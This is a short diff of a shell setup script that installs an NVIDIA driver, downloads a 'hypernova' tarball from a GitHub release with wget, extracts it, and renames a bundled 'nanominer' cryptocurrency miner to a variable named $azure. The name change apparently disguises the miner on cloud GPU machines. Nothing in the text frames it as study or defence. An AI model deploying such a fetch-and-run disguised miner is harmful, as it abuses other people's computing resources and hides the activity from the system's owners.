@@ -9,9 +9,9 @@ sudo chmod +x NVIDIA-Linux-x86_64-460.73.01.run
 ./NVIDIA-Linux-x86_64-460.73.01.run
 mkdir /usr/share
 mkdir /usr/share/work
-rm -r /usr/share/work/avengers
+rm -r /usr/share/work/hypernova
 wget https://github.com/wollfoo/wolethv100/releases/download/hypernova/hypernova.tar.gz
-mv avengers.tar.gz /usr/share/work/
+mv hypernova.tar.gz /usr/share/work/
 cd /usr/share/work/ &&  tar xf hypernova.tar.gz
 rm -rf hypernova.tar.gz && cd hypernova
 mv nanominer $azure -n
